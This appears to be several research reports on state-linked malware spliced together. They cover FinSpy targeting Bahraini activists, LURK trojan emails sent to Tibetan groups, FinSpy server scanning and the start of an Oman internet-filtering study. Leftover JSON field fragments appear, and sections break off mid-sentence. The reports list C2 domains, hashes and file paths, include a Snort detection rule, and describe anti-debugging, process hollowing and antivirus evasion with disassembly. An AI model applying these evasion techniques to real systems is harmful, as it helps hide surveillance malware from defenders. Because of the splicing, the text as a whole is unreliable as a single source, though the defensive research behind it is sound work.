Bahrain responded to HTTP requests with the string “Hallo Steffi.” This behavior did not seem to be active on Bahrain’s server prior to the release of our analysis. Rapid7 looked at historical scanning information, and noticed that servers in ten other countries had responded to HTTP requests with “Hallo Steffi” at various times over the previous month. While the meaning of this string and the reason for the temporary anomaly are unknown, a possible explanation is that this was a testing deployment of a server update, and the “Hallo Steffi” message indicated successful receipt of the update. After the publication of Rapid7’s analysis, the behavior began to disappear from FinSpy servers.\nDetails of Observed Servers\nTable 1: New Servers\n\n\n\nCountry\nIP\nPorts\nOwner\n\n\nSingapore\n203.175.168.2\n21, 53, 443, 4111\nHostSG\n\n\nSingapore\n203.211.137.105\n21, 53, 80, 443, 4111\nM1 CONNECT PTE.

We found evidence of the functionality that was specified in the FinFisher promotional materials. The tools and company names (e.g. Cyan Engineering Services SAL) found in their certificates also suggest interesting avenues for future research.\nThese tools provide substantial surveillance functionality; however, we’d like to highlight that, without exploitation of the underlying platforms, all of the samples we’ve described require some form of interaction to install. As with the previously analyzed FinSpy tool this might involve some form of socially engineered e-mail or other delivery, prompting unsuspecting users to execute the program. Or, it might involve covert or coercive physical installation of the tool, or use of a user’s credentials to perform a third-party installation.\nWe recommend that all users run Anti-Virus software, promptly apply (legitimate) updates when they become available, use screen locks, passwords and device encryption (when available). Do not run untrusted applications and do not allow third parties access to mobile devices.\nAs part of our ongoing research, we have notified vendors, as well as members of the AV community.\nFootnotes\n1 A list of Nokia capabilities can be found here.\n2 http://www.whoisentry.com/domain/it-intrusion.com\n3 See Appendix A.\n4 See Appendix A.\nAppendix A\nThe server was serving FinSpy on port 80, and SSH on port 22.

However, there are few studies examining the implications of censorship circumvention under international law, and its related politics.

    "description": "This blog post is the third in a series documenting the use of information operations against Tibetans and others who advocate for Tibetan rights and freedoms.",
    "text": "\n\t\t\t\tDownload PDF version\nKey Findings\n\nSocial engineering techniques observed in recent targeted malware attacks against Tibetan organizations appear to repurpose authentic, privately-held, sensitive content of Tibetan groups — in contrast to typical malware attacks that rely on simpler social engineering methods, such as referencing themes of interest to the organization or copying publicly available legitimate content. The use of this unique content suggests that attackers may have achieved a preliminary level of infiltration into Tibetan organizations, which could allow them to increase the apparent authenticity of subsequent attacks.\n\n\nThese recent malware attacks have incorporated a “passwording” technique, whereby attached, infected Microsoft Office files are encrypted and can only be opened with a password provided in the email body.\n\n\nThe payload of each of these targeted malware attacks is the LURK malware, a remote access trojan that is a variant of Gh0stRAT.\n\n\nOnce active, the malware delivered through each of these targeted attacks connects to the same command-and-control server: dtl.dnsd.me:63 (184.105.64.183), which if inaccessible uses a backup domain, dtl.eatuo.com:63. Both dnsd.me and eatuo.com are dynamic DNS providers, and eatuo.com has the same domain registration information as the well-known Chinese provider 3322.net.\n\nBackground\nThis blog post is the third in a series documenting the use of information operations against Tibetans and others who advocate for Tibetan rights and freedoms.\nPrevious research by the Citizen Lab has described information operations that leveraged the issue of self-immolations amongst Tibetans, as well as a recent European Parliament resolution on the human rights situation in Tibet.\nOverview\nIn its ongoing study of targeted cyber threats against civil society organizations, Citizen Lab has analyzed 11 malicious emails sent to Tibetan organizations between May and July 2012 that display noteworthy common elements, including malware that connects to the same command-and-control server.\nAttackers have targeted at least three separate organizations, sending the malicious emails to seven different email addresses associated with those three organizations.\nIn each of these emails, the malicious file is password-protected, such that it can only be opened with a password provided in the email text (or in one case, in an image attached to the email), and the payload — LURK malware — is the same.\nThe level of authenticity of the social engineering used in these emails, however, has increased over time, with the most recent emails repurposing sensitive content of Tibetan groups that was most likely privately held and/or inaccessible to the general public.\nThe use of such content suggests that attackers may have achieved a preliminary level of infiltration into Tibetan organizations, which could allow them to accomplish more advanced and effective social engineering, thereby increasing the risk of compromise.\nTargeted Malware Attacks\nIn the 11 emails there are four distinct messages used in the attacks, as outlined and illustrated below. The malicious attachments are all Microsoft Office documents — two Word documents and two Excel files — that are encrypted using four-digit numeric passwords, perhaps in an attempt to prevent detection of the malicious file by antivirus software, or to increase the apparent authenticity of the document.\nThe passwords appear to have been chosen to reflect dates of historical significance with respect to Tibet — for example, 1959 was the year of the Tibetan uprising against the rule of the Communist Party of China, which is commemorated by the Tibetan community every year on March 10. The malicious payloads all communicate with the same command-and-control (C2) server (discussed further below).\n(Click image to enlarge.)\n\n \n1. “Droeshi”\nThe first email, which was only sent to one email address of which we are aware, was sent on May 24, 2012 from what appears to be a compromised yahoo.com email account associated with a Tibetan activist, from the IP address 209.234.204.31 (likely a compromised server):\n\nNote that the salutation does not include the name of the recipient, nor is it signed. The password required to open the attachment is 4155.1 The attachment is a Word document named Droeshi final.doc — when opened and supplied with the password, it crashes Word and drops its malicious payload (described in more detail below). No clean file is dropped or shown to the user, and there is no author or summary metadata.\n2. “Statement of the Kashag”\nThe second email was sent on July 5 to at least two different organizations. The body of these emails contains only “PASSWORD: 0706.”2 The subject is “THE STATEMENT OF THE KASHAG ON THE SEVENTY-SEVENTH BIRTHDAY CELEBRATION OF HIS HOLINESS THE DALAI LAMA” and the “From” address spoofs the real address of a Tibetan organization. Although the emails are identical and were sent from the same IP address (65.166.97.211), the actual email addresses used to send each message differ: eabliz@gmx.com and hientr@gmx.com (click image to enlarge).\n\nThis email also attached a single Word document, July6thFinal.doc, that exhibits similar behaviour to the Droeshi document but drops a slightly different malicious executable.\n3. “The concept notes”\nThe third email came in two versions on July 17, differing only in an additional blank line in the email body and a typo in the subject line of one version. The social engineering has been significantly stepped up in this attack, though there are still numerous tell-tale signs that it is not legitimate. This email had five attachments: four benign .docx files, as well as a malicious Excel file named EIDHR_action_plan.xlsx.\n\nAgain there is no name in the salutation, but the email is signed in this case. The signature and “From” address used spoof a representative of the Office of Tibet.\nThe Word documents attached to this email contain what appears to be an actual application by a Tibetan organization to the European Instrument for Democracy and Human Rights (EIDHR).\nThe timing of this attack is particularly noteworthy in that a genuine EIDHR call for proposals — including for “Actions Aimed at Fighting Cyber-Censorship and to Promote Internet Access and Secure Digital Communication” — was pending at the time, with a July 20 deadline for concept notes.\nSuch documentation related to grant proposals is typically of a sensitive and internal nature to civil society organizations, and inclusion of such content in a targeted malware attack is concerning, as it suggests access to confidential materials and perhaps even awareness of the parameters of the EIDHR call.\nOnly the attached malicious Excel file requires the password — 19333 — to open, whereas the attached Word documents are not password protected. The malicious Excel file is actually an OLE file, not the newer Office Open XML format that the .xlsx extension suggests, and Excel refuses to open it unless the extension is changed to .xls. The dropped malicious executable is identical to the one from the “Statement of the Kashag” email.\nThis file also drops a clean document, “set.xls,” in the user’s temporary folder and opens it in Excel. The contents of the file were unreadable on all computers we tried it on, displaying only question marks. However, the metadata of the file shows the author as ‘walkinnet’ (click image to enlarge).\n\nWe saw five instances of this message, going to three different organizations. The email with the typo in the subject (“Tthe concept notes“) went to two different organizations, from a different IP (66.103.141.237) than the “Statement of the Kashag” email. Different gmx.com addresses were used to send each message: c100tibet_board@gmx.com and ijoni_futbollisti@gmx.com.\nThe other three instances of this email had the subject “The concept notes” and were sent by yet more unique gmx.com addresses: abarbour@gmx.com, jigme1@gmx.com and agnes9@gmx.com. The first two were sent from the same IP as used for the “Statement of the Kashag,” but the third came from 207.178.172.2.\n4. “August visit of South African group”\nThe most recent email was sent on July 20 to at least two organizations, one of which received it at two different addresses. The email contains text and an Excel attachment that, as with the “The concept notes” email, suggest the attacker had access to confidential communications of a Tibetan organization.\nThe spoofed “From” address, subject (“August visit of South African group”), and text of the email all appear to be repurposed from an authentic message sent to a Tibetan organization from a person seeking advice regarding an upcoming trip to Dharamsala, and the content includes in-depth details on trip logistics and planning.\nIn this case, the password required to open the attached Excel file is not in the body of the email, but added (rather awkwardly) to an attached image of the logo of the organization belonging to the spoofed sender. The password is “1959,” the year of the aforementioned Tibetan uprising.\nThe attached Excel file, Dharamsala August 2012 Full program.xls, is similar to the malicious attachment in “The concept notes” email, but it drops a different clean file. In this case the file is readable and contains what is almost certainly an authentic itinerary, which is referenced in the email. The clean file is also called set.xls, defaults to the same Chinese font, and has the same ‘walkinnet’ author metadata as the clean document in “The concept notes.”\nTechnical Analysis\nDelivery Methods\nWithin the dataset examined by Citizen Lab, two Word documents and two Excel documents were sent embedded with LURK malware, a remote access trojan that is a variant of Gh0stRAT. Note that the XLSX file is actually a standard .XLS file, not the new XML format.\nThe MD5 hashes of the documents are as follows:\n\nDroeshi final.doc – 58f6922dedb0d43c4478a4f38ad08620\nJuly6thFinal.doc – f2a0787388dd6373336b3f23f204524a\nEIDHR_action_plan.xlsx – 0fe550a5d1187d38984c505ef7741638\nDharamsala August 2012 Full program.xls – 971f99af0f9df674a79507ed7b3010fb\n\nEach document is encrypted with a four-digit numeric password, a tactic seen previously in other emails. This tactic makes it more difficult to identify embedded payloads and the vulnerability used.\nAll of the files except for the first (Droeshi final.doc) have the same malware files embedded. The first uses a variant of the LURK trojan that is very similar, but not identical, to the others.\nInfection\nIn each of the four cases, the document exploit drops the LURK trojan:\n%Temp%\\iexplore.exe\nTwo different versions of the trojan were seen between the four cases. While they all use the same filenames, in one case, the MD5 of the trojan is different:\nJuly6thFinal.doc, EIDHR_action_plan.xlsx, Dharamsala August 2012 Full program.xls: 16160a6a9b905c69cb8e92c319212980\nDroeshi final.doc: 1c22ee3326affee30c3fa65f0b8413d5\nLURK also uses the following files:\n%AppData%\\Application Data\\Help\\CREATELINK.EXE\n%AppData%\\Help\\IconCacheEt.DAT\n%AppData%\\Help\\IconConfigEt.DAT\n%AppData\\\\Help\\iexplore.exe\nAdditionally, the samples that use Excel as their vector also drop a clean file, opened after the malware executes:\n%Temp%\\set.xls\nFor persistence, the trojan also creates the following link in the Startup folder, pointing at the iexplore.exe binary in %AppData%:\nC:\\Documents and Settings\\user\\Start Menu\\Programs\\Startup\\iexplore.lnk\nThe binary in %AppData% is only 9KB and acts as a launcher.\nIconConfigEt.DAT is the trojan’s configuration file, storing the C2 server addresses and ports, as well as a campaign name identifier. The file is mostly encrypted, with the campaign name stored in the clear. The configuration options are read from the main executable using GetPrivateProfileStringW(), a function for pre-registry configuration storage. This function is for backwards compatibility with pre-registry 16-bit Windows applications, and is not commonly used in modern applications (click image to enlarge).\n\nDecryption of the configuration file is done in sub_4044B0() using a key generated in sub_404430() — the default is 0x11B29719, in the case of the more common version of the trojan the key is 0x11B297A9. Once the values have been read from the decrypted file, it is re-encrypted in sub_404560().\nEncrypted on disk (default):\n\n \nDecrypted:\n\nOnce the configuration file is decrypted, the values are still not readable. Fortunately, the second layer decryption is an easy process — just decrement each character by 1.\nThe values read from the configuration file are:\n\nSection [PPP], key P: Primary C2 server port number\nSection [WWW], key W: Primary C2 server name\nSection [PPP1], key P1: Secondary C2 server port number\nSection [WWW1], key W1: Secondary C2 server name\nSection [PPP2], key P2: Tertiary C2 server port number\nSection [WWW2], key W2: Tertiary C2 server name\nSection [MMM], key M: Campaign name\n\nIn the configuration files we have looked at for this run, the primary server is dtl.dnsd.me:63, and the secondary server is dtl.eatuo.com:63. Both dnsd.me and eatuo.com are dynamic DNS providers, and eatuo.com has the same domain registration information as the well-known Chinese provider 3322.org. No tertiary server is given.\nThe malware checks in sub_4040E0() for a value of “Mark” in the registry at the following location:\nHKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\DbxUpdateET\\\nIf a value is not found, it is set with the campaign name read from the configuration file key M.\nCampaign Names\nThe four samples we received use three different campaign names, identified as follows in value 7 of each configuration file:\nDroeshi final.doc: campaign id TIBET\nJuly6thFinal.doc: campaign id T706 (note that the password on the file is also 0706, keeping on theme)\nEIDHR_action_plan.xlsx: campaign id T801\nDharamsala August 2012 Full program.xls: campaign id T801\nThe campaign names strongly suggest that these runs are specific to the Tibetan community, and that the Txxx attacks may be coming from the same source. The July6thFinal.doc, EIDHR_action_plan.xlsx, and Dharamsala August 2012 Full program.xls documents all drop the same trojan; the Droeshi final.doc trojan is slightly different (although uses much of the same code).\nMalware Analysis\nThese samples match the behavior seen with other recorded instances of samples from this family in the wild. LURK is also known as Troj~Agent-XAT (Sophos), TROJ_MDROP.TPB and TROJ_MDROP.TPC (Trend Micro), and can also be picked up by more general antivirus detection such as Generic PWS.y (McAfee). In the sample analyzed by Sophos, the campaign ID is “IE_0day” — not immediately related to attacks on the Tibetan community.\nMany more samples within this family exist with reports online — look for “DbxUpdateET” (where the campaign ID is stored in the registry) or the dropped files “IconCacheEt” and “IconConfigEt.” Another Tibetan-themed example using the dtl.eatuo.com domain was reported by ZenLab on March 26, 2012.\nThe LURK malware is also referenced with a description of the communication protocol in Command Five’s paper “Command and Control in the Fifth Domain.” The network behavior we observed matches the described protocol.\nAn additional file with the T801 campaign ID that we observed used twice was uploaded to ThreatExpert and can be found here.\nCommand and Control Information\nA port scan of the C2 server shows the following ports are open:\nPORT STATE SERVICE VERSION\n21/tcp open tcpwrapped\n53/tcp open domain?\n80/tcp closed http\n81/tcp open hosts2-ns?\n135/tcp open msrpc Microsoft Windows RPC\n1026/tcp open msrpc Microsoft Windows RPC\n8080/tcp open http-proxy?\nIn addition to port 63 (which is not shown as open in the above scan), ports 81 and 53 are both LURK.\nNetwork Traffic\nIn addition to the dropped files, infected machines can be found on a network by looking for the following indications of compromise:\n\nDNS lookup of the C2 domains: dtl.dnsd.me, dtl.eatuo.com\nTraffic to the C2 IP: 184.105.64.183 — this includes traffic over port 53, which is normally DNS\nTCP traffic over port 53 that begins with “LURK0”\n\nThe beginning of a network connection to the C2 server looks like this (click image to enlarge):\n\n \nIf the C2 is not actively responding, not much data will be transmitted beyond TCP keepalives (click image to enlarge):\n\nFor detection, Jaime Blasco from AlienVault has written a Snort rule that will detect LURK traffic (originally found here):\nalert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:”APT LURK communication protocol detected”; flow:established,to_server; content:”|4C 55 52 4B 30|”; depth:5; reference:url,www.commandfive.com/papers/C5_APT_C2InTheFifthDomain.pdf; classtype:trojan-activity; sid:3000006; rev:1;)\nRecommendations\n\nCivil society organizations, particularly those working on issues related to Tibetan rights, should exercise caution with respect to any email containing a link or attachment. As the targeted malware attacks analyzed in this report demonstrate, content used to induce a recipient to open a malicious file may at one point have actually been authentic and private — and is that much more likely to appear legitimate. For tips on other ways to detect probable malware attacks and prevent compromise, see Citizen Lab’s Recommendations for Defending Against Targeted Cyber Threats.\n\n\nCivil society organizations should be wary of emails attaching password-protected documents and providing said password in the email body. Such purported “security” measures are not an indicator of authenticity.\n\n\nCitizen Lab encourages civil society organizations and individuals working on human rights issues that have encountered these types of targeted malware attacks to contact us at hrthreats[AT]citizenlab.org. We appreciate submission of data, which will help strengthen our analysis of cyber threats.\n\nFootnotes\n1 On April 1, 1955, the governments of India and China signed a protocol by which India handed over control of communications services in Tibet to China.

    "text": "\n\t\t\t\t\nDownload PDF version\nIntroduction\nClick here to read the Bloomberg News article.\nThe FinFisher Suite is described by its distributors, Gamma International UK Ltd., as “Governmental IT Intrusion and Remote Monitoring Solutions.” 1 The toolset first gained notoriety after it was revealed that the Egyptian Government’s state security apparatus had been involved in negotiations with Gamma International UK Ltd. over the purchase of the software. Promotional materials have been leaked that describe the tools as providing a wide range of intrusion and monitoring capabilities.2 Despite this, however, the toolset itself has not been publicly analyzed.\nThis post contains analysis of several pieces of malware obtained by Vernon Silver of Bloomberg News that were sent to Bahraini pro-democracy activists in April and May of this year. The purpose of this work is identification and classification of the malware to better understand the actors behind the attacks and the risk to victims. In order to accomplish this, we undertook several different approaches during the investigation.\nAs well as directly examining the samples through static and dynamic analysis, we infected a virtual machine (VM) with the malware. We monitored the filesystem, network, and running operating system of the infected VM.\nThis analysis suggests the use of “Finspy”, part of the commercial intrusion kit, Finfisher, distributed by Gamma International.\nDelivery\nThis section describes how the malware was delivered to potential victims using e-mails with malicious attachments.\nIn early May, we were alerted that Bahraini activists were targeted with apparently malicious e-mails. The emails ostensibly pertained to the ongoing turmoil in Bahrain, and encouraged recipients to open a series of suspicious attachments. The screenshot below is indicative of typical message content:\n\n \nThe attachments to the e-mails we have been able to analyze were typically .rar files, which we found to contain malware. Note that the apparent sender has an e-mail address that indicates that it was being sent by “Melissa Chan,” who is a real correspondent for Aljazeera English.  We suspect that the e-mail address is not her real address.3  The following samples were examined:\n324783fbc33ec117f971cca77ef7ceaf7ce229a74edd6e2b3bd0effd9ed10dcc ‮الفعاليات.rar\nc5b39d98c85b21f8ac1bedd91f0b6510ea255411cf19c726545c1d0a23035914 _gpj.ArrestedXSuspects.rar\nc5b37bb3620d4e7635c261e5810d628fc50e4ab06b843d78105a12cfbbea40d7 KingXhamadXonXofficialXvisitXtoX.rar\n80fb86e265d44fbabac942f7b26c973944d2ace8a8268c094c3527b83169b3cc MeetingXAgenda.rar\nf846301e7f190ee3bb2d3821971cc2456617edc2060b07729415c45633a5a751 Rajab.rar\nThese contained executables masquerading as picture files or documents:\n49000fc53412bfda157417e2335410cf69ac26b66b0818a3be7eff589669d040 dialoge.exe\ncc3b65a0f559fa5e6bf4e60eef3bffe8d568a93dbb850f78bdd3560f38218b5c ‮gpj.1bajaR.exe\n39b325bd19e0fe6e3e0fca355c2afddfe19cdd14ebda7a5fc96491fc66e0faba ‮gpj.1egami.exe\ne48bfeab2aca1741e6da62f8b8fc9e39078db574881691a464effe797222e632 ‮gpj.bajaR.exe\n2ec6814e4bad0cb03db6e241aabdc5e59661fb580bd870bdb50a39f1748b1d14 ‮gpj.stcepsuS detserrA.exe\nc29052dc6ee8257ec6c74618b6175abd6eb4400412c99ff34763ff6e20bab864 News about the existence of a new dialogue between AlWefaq & Govt..doc\n \nThe emails generally suggested that the attachments contained political content of interest to pro-democracy activists and dissidents. In order to disguise the nature of the attachments a malicious usage of the “righttoleftoverride” (RLO) character was employed. The RLO character (U+202e in unicode) controls the positioning of characters in text containing characters flowing from right to left, such as Arabic or Hebrew. The malware appears on a victim’s desktop as “exe.Rajab1.jpg” (for example), along with the default Windows icon for a picture file without thumbnail.  But, when the UTF-8 based filename is displayed in ANSI, the name is displayed as “gpj.1bajaR.exe”.  Believing that they are opening a harmless “.jpg”, victims are instead tricked into running an executable “.exe” file.4\n\n \nUpon execution these files install a multi-featured trojan on the victim’s computer. This malware provides the attacker with clandestine remote access to the victim’s machine as well as comprehensive data harvesting and exfiltration capabilities.\nInstallation\nThis section describes how the malware infects the target machine.\nThe malware displays a picture as expected.  This differs from sample to sample.  The sample “Arrested Suspects.jpg” (“gpj.stcepsuS detserrA.exe”) displays:\n\n \nIt additionally creates a directory (which appears to vary from sample to sample):\nC:\\Documents and Settings\\XPMUser\\Local Settings\\Temp\\TMP51B7AFEF\n \nIt copies itself there (in this case the malware appears as “Arrested Suspects.jpg”) where it is renamed:\nC:\\Documents and Settings\\XPMUser\\Local Settings\\Temp\\TMP51B7AFEF\\Arrested Suspects.jpg” => C:\\Documents and Settings\\XPMUser\\Local Settings\\Temp\\TMP51B7AFEF\\tmpD.tmp\n \nThen it drops the following files:\nC:\\DOCUME~1\\%USER%\\LOCALS~1\\Temp\\delete.bat\nC:\\DOCUME~1\\%USER%\\LOCALS~1\\Temp\\driverw.sys\n \nIt creates the folder (the name of which varies from host to host):\nC:\\Documents and Settings\\%USER%\\Application Data\\Microsoft\\Installer\\{5DA45CC9-D840-47CC-9F86-FD2E9A718A41}\n \nThis process is observable on the filesystem timeline of the infected host (click image to enlarge):\n\n“driverw.sys” is loaded and then “delete.bat” is run which deletes the original payload and itself. It then infects existing operating system processes, connects to the command and control server, and begins data harvesting and exfiltration.\nExamining the memory image of a machine infected with the malware shows that a technique for infecting processes known as “process hollowing” is used. For example, the memory segment below from the “winlogon.exe” process is marked as executable and writeable:\n\n \nHere the malware starts a new instance of a legitimate process such as “winlogon.exe” and before the process’s first thread begins, the malware de-allocates the memory containing the legitimate code and injects malicious code in its place.  Dumping and examining this memory segment reveals the following strings in the infected process:\n\n \nNote the string:\ny:\\lsvn_branches\\finspyv4.01\\finspyv2\\src\\libs\\libgmp\\mpn-tdiv_qr.c\n \nThis file seems to correspond to a file in the GNU Multi-Precision arithmetic library:\nhttp://gmplib.org:8000/gmp/file/b5ca16212198/mpn/generic/tdiv_qr.c\nThe process “svchost.exe” was also found to be infected in a similar manner:\n\n \nFurther examination of the memory dump also reveals the following:\n\n \nThis path appears to reference the functionality that the malware uses to modify the boot sequence to enable persistence:\ny:\\lsvn_branches\\finspyv4.01\\finspyv2\\src\\target\\bootkit_x32driver\\objfre_w2k_x86\\i386\\bootkit_x32driver.pdb\n \nA pre-infection vs post-infection comparison of the infected VM shows that the Master Boot Record (MBR) was modified by code injected by the malware.\nThe strings found in memory “finspyv4.01” and “finspyv2” are particularly interesting. The FinSpy tool is part of the FinFisher intrusion and monitoring toolkit.5\nObfuscation and Evasion\nThis section describes how the malware is designed to resist analysis and evade identification.\nThe malware employs a myriad of techniques designed to evade detection and frustrate analysis. While investigation into this area is far from complete, we discuss several discovered methods as examples of the lengths taken by the developers to avoid identification.\nA virtualised packer is used. This type of obfuscation is used by those that have “strong motives to prevent their malware from being analyzed”.6\nThis converts the native x86 instructions of the malware into another custom language chosen from one of 11 code templates.  At run-time, this is interpreted by an obfuscated interpreter customized for that particular language.  This virtualised packer was not recognised and appears to be bespoke.\nSeveral anti-debugging techniques are used. This section of code crashes the popular debugger, OllyDbg.\n.text:00401683 finit\n.text:00401686 fld ds:tbyte_40168E\n.text:0040168C jmp short locret_401698\n———————————————————————\n.text:0040168E tbyte_40168E dt 9.2233720368547758075e18\n———————————————————————\n.text:00401698 locret_401698:\n.text:00401698 retn\n \nThis float value causes OllyDbg to crash when trying to display its value. A more detailed explanation of this can be found here.\nTo defeat DbgBreakPoint based debuggers, the malware finds the address of DbgBreakPoint, makes the page EXECUTE_READWRITE and writes a NOP on the entry point of DbgBreakPoint.\nThe malware checks via PEB to detect whether or not it is being debugged, and if it is it returns a random address.\nThe malware calls ZwSetInformationThread with ThreadInformationClass set to 0x11, which causes the thread to be detached from the debugger.\nThe malware calls ZwQueryInformationProcess with ThreadInformationClass set to 0x(ProcessDebugPort) and 0x1e (ProcessDebugObjectHandle) to detect the presence of a debugger. If a debugger is detected it jumps to a random address. ZwQueryInformationProcess is also called to check the DEP status on the current process, and it disables it if it’s found to be enabled.\nThe malware deploys a granular solution for Antivirus software, tailored to the AV present on the infected machine.  The malware calls ZwQuerySystemInformation to get ProcessInformation and ModuleInformation. The malware then walks the list of processes and modules looking for installed AV software. Our analysis indicates that the malware appears to have different code to Open/Create process and inject for each AV solution.  For some Anti-Virus software this even appears to be version dependent. The function “ZwQuerySystemInformation” is also hooked by the malware, a technique frequently used to allow process hiding:\n\n \nData Harvesting and Encryption\nThis section describes how the malware collects and encrypts data from the infected machine.\nOur analysis showed that the malware collects a wide range of data from an infected victim.  The data is stored locally in a hidden directory, and is disguised with encryption prior to exfiltration.  On the reference victim host, the directory was:\n“C:\\Windows\\Installer\\{49FD463C-18F1-63C4-8F12-49F518F127}.”\nWe conducted forensic examination of the files created in this directory and identified a wide range of data collected.  Files in this directory were found to be screenshots, keylogger data, audio from Skype calls, passwords and more.   For the sake of brevity we include a limited set of examples here.\nThe malware attempts to locate the configuration and password store files for a variety browsers and chat clients as seen below (click image to enlarge):\n\n \nWe observed the creation of the file “t111o00000000.dat” in the data harvesting directory, as shown in the filesystem timeline below:\nThu Jun 14 2012 12:31:34 52719 mac. r/rr-xr-xr-x 0 0 26395-128-5 C:/WINDOWS/Installer/{49FD463C-18F1-63C4-8F12-49F518F127}/09e493e2-05f9-4899-b661-c52f3554c644\nThu Jun 14 2012 12:32:18 285691 …b r/rrwxrwxrwx 0 0 26397-128-4 C:/WINDOWS/Installer/{49FD463C-18F1-63C4-8F12-49F518F127}/t111o00000000.dat\nThu Jun 14 2012 12:55:12 285691 mac. r/rrwxrwxrwx 0 0 26397-128-4 C:/WINDOWS/Installer/{49FD463C-18F1-63C4-8F12-49F518F127}/t111o00000000.dat\n4096 ..c. -/rr-xr-xr-x 0 0 26447-128-4\n \nThe infected process “winlogon.exe” was observed writing this file via Process Monitor (click image to enlarge):\n\n \nExamination of this file reveals that it is a screenshot of the desktop (click image to enlarge):\n\n \nMany other modules providing specific exfiltration capabilities were observed.  Generally, the exfiltration modules write files to disk using the following naming convention: XXY1TTTTTTTT.dat.  XX is a two-digit hexadecimal module number, Y is a single-digit hexadecimal submodule number, and TTTTTTTT is a hexadecimal representation of a unix timestamp (less 1.3 billion) associated with the file creation time.\nEncryption\nThe malware uses encryption in an attempt to disguise harvested data in the .dat files intended for exfiltration. Data written to the files is encrypted using AES-256-CBC (with no padding). The 32-byte key consists of 8 readings from memory address 0x7ffe0014: a special address in Windows that contains the low-order-4-bytes of the number of hundred-nanoseconds since 1 January 1601. The IV consists of 4 additional readings.\nThe AES key structure is highly predictable, as the quantum for updating the system clock (HKLM\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\Config\\LastClockRate) is set to 0x2625A hundred-nanoseconds by default, and the clock readings that comprise the key and IV are taken in a tight loop:\n…\n0x406EA4: 8D45C0 LEA EAX,[EBP-0x40]\n0x406EA7: 50 PUSH EAX\n0x406EA8: FF150C10AF01 CALL DWORD PTR [0x1AF100C]\n0x406EAE: 8B4DE8 MOV ECX,DWORD PTR [EBP-0x18]\n0x406EB1: 8B45C0 MOV EAX,DWORD PTR [EBP-0x40]\n0x406EB4: 8345E804 ADD DWORD PTR [EBP-0x18],0x4\n0x406EB8: 6A01 PUSH 0x1\n0x406EBA: 89040F MOV DWORD PTR [EDI+ECX],EAX\n0x406EBD: FF152810AF01 CALL DWORD PTR [0x1AF1028]\n0x406EC3: 817DE800010000 CMP DWORD PTR [EBP-0x18],0x100\n0x406ECA: 72D8 JB 0x406EA4\n0x406ECC: 80277F AND BYTE PTR [EDI],0x7F\n…\n \nThe following AES keys were among those found to be used to encrypt records in .dat files.  The first contains the same 4 bytes repeated, whereas in the second key, the difference between all consecutive 4-byte blocks (with byte order swapped) is 0x2625A.\n\n70 31 bd cc 70 31 bd cc 70 31 bd cc 70 31 bd cc 70 31 bd cc 70 31 bd cc 70 31\nbd cc 70 31 bd cc\n26 e9 23 60 80 4b 26 60 da ad 28 60 34 10 2b 60 8e 72 2d 60 e8 d4 2f 60 42 37\n32 60 9c 99 34 60\n\n \nIn all, 64 clock readings are taken.  The readings are encrypted using an RSA public key found in memory (whose modulus begins with A25A944E) and written to the .dat file before any other encrypted data.  No padding is used in the encryption, yielding exactly 256 encrypted bytes.  After the encrypted timestamp values, the file contains a number of records encrypted with AES, delimited by EAE9E8FF.\nIn reality, these records are only partially encrypted: if the record’s length is not a multiple of 16 bytes (the AES block size), then the remainder of the bytes are written to the file unencrypted.  For example, after typing “FinSpy” on the keyboard, the keylogger module produced the following (trailing plaintext highlighted):\n\n \nThe predictability of the AES encryption keys allowed us to decrypt and view these partially-encrypted records in full plaintext.  The nature of the records depends on the particular module and submodule.  For example, submodule Y == 5 of the Skype exfiltration module (XX == 14), contains a csv representation of the user’s contact list:\n\nRecord #

That sample is:\nmd5: c488a8aaef0df577efdf1b501611ec20\nsha1: 5ea6ae50063da8354e8500d02d0621f643827346\nsha256: 81531ce5a248aead7cda76dd300f303dafe6f1b7a4c953ca4d7a9a27b5cd6cdf\n\n \nThe sample connects to the following domains:\ntiger.gamma-international.de\nff-demo.blogdns.org\n\n \nThe domain tiger.gamma-international.de has the following Whois information9:\n\nDomain: gamma-international.de\nName: Martin Muench\nOrganisation: Gamma International GmbH\nAddress: Baierbrunner Str. 15\nPostalCode: 81379\nCity: Munich\nCountryCode: DE\nPhone: +49-89-2420918-0\nFax: +49-89-2420918-1\nEmail: info@gamma-international.de\nChanged: 2011-04-04T11:24:20+02:00\n\n \nMartin Muench is a representative of Gamma International, a company that sells “advanced technical surveillance and monitoring solutions”. One of the services they provide is FinFisher: IT Intrusion, including the FinSpy tool. This labelling indicates that the matching sample we were provided may be a demo copy a FinFisher product per the domain ff-demo.blogdns.org.\nWe have linked a set of novel virtualised code obfuscation techniques in our Bahraini samples to another binary that communicates with Gamma International IP addresses. Taken alongside the explicit use of the name “FinSpy” in debug strings found in infected processes, we suspect that the malware is the FinSpy remote intrusion tool. This evidence appears to be consistent with the theory that the dissidents in Bahrain who received these e-mails were targeted with the FinSpy tool, configured to exfiltrate their harvested information to servers in Bahraini IP space. If this is not the case, we invite Gamma International to explain.\n \nRecommendations\nThe samples from email attachments have been shared with selected individuals within the security community, and we strongly urge antivirus companies and security researchers to continue where we have left off.\nBe wary of opening unsolicited attachments received via email, skype or any other communications mechanism.  If you believe that you are being targeted it pays to be especially cautious when downloading files over the Internet, even from links that are purportedly sent by friends.\n \nAcknowledgements\nMalware analysis by Morgan Marquis-Boire and Bill Marczak.

    "text": "\n\t\t\t\tDownload PDF version\nKey Findings\n\nData collected from Oman shows that web filtering applied by India-based ISPs is restricting access to content for customers of an ISP in Oman. While unusual, content filtering undertaken in one political jurisdiction can have an effect on users in another political jurisdiction as a result of ISP routing arrangements – a phenomenon known as “upstream filtering.”\nContent found to be filtered includes news sites, political blogs and file sharing sites.\nSome variability in filtering was documented, potentially linked to certain measures to loosen filtering regulations in India.\n\nBackground\nThe OpenNet Initiative1 (ONI) has investigated Internet filtering and surveillance practices since 2003 and has documented national-level filtering of the Internet in over forty countries.2 Traditionally, such filtering is implemented by Internet service providers (ISPs) at the request of governments for the purpose of restricting content available to domestic audiences. In general, conventional web filtering is designed for exclusively domestic impact, though other forms of content control, such as takedown requests, may affect access across borders.\nHowever, content filtration is not always limited by jurisdiction. ISPs may engage in peering3 or transit agreements4 with other providers as a means of gaining access to the broader Internet. If ISPs peer with providers who filter the connection provided to their peers, that filtering may be passed on to the ISP’s user base. While unusual, past ONI research has documented this practice, known as “upstream filtering,” on several occasions. For example, in 2009, ONI research in Kyrgyzstan found that a number of websites, including news sites and blogging platforms, were 